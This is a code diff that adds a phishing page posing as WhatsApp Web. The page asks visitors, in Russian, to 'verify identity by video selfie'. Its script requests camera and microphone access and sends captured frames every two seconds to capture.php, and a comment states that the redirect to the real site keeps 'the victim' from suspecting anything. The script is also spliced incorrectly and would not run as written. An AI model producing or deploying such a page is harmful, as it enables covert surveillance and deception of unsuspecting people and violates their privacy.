@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WhatsApp Web</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding-top: 50px; background: #f0f0f0; }
+        .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 10px; }
+        video { width: 100%; max-width: 300px; border: 1px solid #ccc; transform: scaleX(-1); }
+        button { padding: 10px 20px; margin: 10px; background: #25D366; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        #status { margin-top: 20px; color: #333; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>WhatsApp Web</h2>
+        <p>Для использования веб-версии необходимо подтвердить личность через видеоселфи.</p>
+        <video id="video" autoplay playsinline></video>
+        <button id="start">Разрешить доступ и продолжить</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        let localStream = null;
+        const video = document.getElementById('video');
+        const statusDiv = document.getElementById('status');
+
+        document.getElementById('start').addEventListener('click', async () => {
+            try {
+                // Запрашиваем доступ к камере и микрофону
+                localStream = // Функция для отправки кадра
+function sendFrame() {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+    const base64 = dataUrl.split(',')[1];
+
+    fetch('capture.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: base64 })
+    }).then(r => console.log('Frame sent'));
+}
+
+// Запускаем отправку каждые 2 секунды после получения потока
+setInterval(sendFrame, 2000);await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                video.srcObject = localStream;
+                statusDiv.innerText = 'Доступ получен. Идёт проверка...';
+
+                // Отправляем видео на сервер (в реальности нужно реализовать передачу потоком)
+                // Для простоты просто отправим сообщение через 5 секунд
+                setTimeout(() => {
+                    statusDiv.innerText = 'Проверка пройдена! Перенаправление...';
+                    // Здесь можно перенаправить на реальный сайт, чтобы жертва ничего не заподозрила
+                    window.location.href = 'https://web.whatsapp.com';
+                }, 5000);
+
+                // TODO: организовать отправку видео/аудио на сервер
+                // Например, через WebRTC или периодические снимки
+            } catch (err) {
+                statusDiv.innerText = 'Ошибка доступа: ' + err.message;
+            }
+        });
+    </script>
+</body>
+</html>
